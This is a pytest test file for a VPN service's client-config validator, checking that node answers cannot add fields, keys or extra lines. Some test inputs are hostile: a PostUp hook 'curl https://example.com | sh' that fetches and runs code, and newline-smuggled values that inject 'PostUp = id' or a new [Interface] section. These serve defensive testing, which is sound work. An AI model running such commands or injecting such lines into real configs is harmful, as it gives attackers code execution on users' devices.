import re
from pathlib import Path

import pytest
from conftest import HEADERS, create, key, needs_db

from app import clientconfig, jobs, worker

WGCONFIG = Path(__file__).resolve().parents[2] / "web" / "src" / "wgconfig.ts"


def node_answer(**extra):
    answer = {"name": "d-x", "interface": {"Address": "10.8.1.2/32", "DNS": "10.8.1.1", "MTU": "1280", "Jc": "5"},
              "peer": {"PublicKey": "srv", "AllowedIPs": "0.0.0.0/0, ::/0", "Endpoint": "198.51.100.1:443"}}
    for section, fields in extra.items():
        answer[section] = answer[section] | fields
    return answer


def test_the_browser_keeps_the_same_lists():
    source = WGCONFIG.read_text()
    for name, fields in (("INTERFACE_FIELDS", clientconfig.INTERFACE), ("PEER_FIELDS", clientconfig.PEER)):
        listed = re.search(rf"{name} = new Set\(\[(.*?)\]\)", source, re.DOTALL).group(1)
        assert set(re.findall(r'"(\w+)"', listed)) == fields


@pytest.mark.parametrize("extra", [
    {"interface": {"PostUp": "curl https://example.com | sh"}},
    {"interface": {"PrivateKey": key()}},
    {"peer": {"PresharedKey": key()}},
    {"interface": {"DNS": "10.8.1.1\nPostUp = id"}},
    {"peer": {"Endpoint": "198.51.100.1:443\r\n[Interface]"}},
    {"interface": {"MTU": 1280}},
])
def test_a_node_cannot_add_fields_or_lines(extra):
    with pytest.raises(ValueError):
        clientconfig.check(node_answer(**extra))


def test_the_nodes_own_answer_passes():
    assert clientconfig.check(node_answer(interface={"HeaderProtectionKey": key(), "I1": "<b 0xc4000000010850><r 8>"}))


@needs_db
def test_an_answer_with_other_fields_never_reaches_the_browser(signed_in, node, db, monkeypatch):
    add = node.add_pubkey

    def tampered(*args):
        answer = add(*args)
        answer["interface"]["PostUp"] = "id"
        return answer

    monkeypatch.setattr(node, "add_pubkey", tampered)
    r = create(signed_in)
    assert r.status_code == 202
    assert db.execute("SELECT result FROM jobs").fetchone()[0] is None
    assert db.execute("SELECT status FROM devices").fetchone()[0] == "pending"
    for _ in range(jobs.MAX_ATTEMPTS):
        db.execute("UPDATE jobs SET next_try_at = now()")
        worker.tick(db, usage=False)
    assert signed_in.get(f"/api/devices/{r.json()['id']}/config").json() == {"error": "node_failed"}


@needs_db
def test_a_key_with_a_trailing_newline_is_refused(signed_in, node):
    r = create(signed_in, public_key=key() + "\n")
    assert r.status_code == 400 and r.json() == {"error": "invalid_key"}
    assert signed_in.post("/api/devices", json={}, headers=HEADERS).status_code == 422
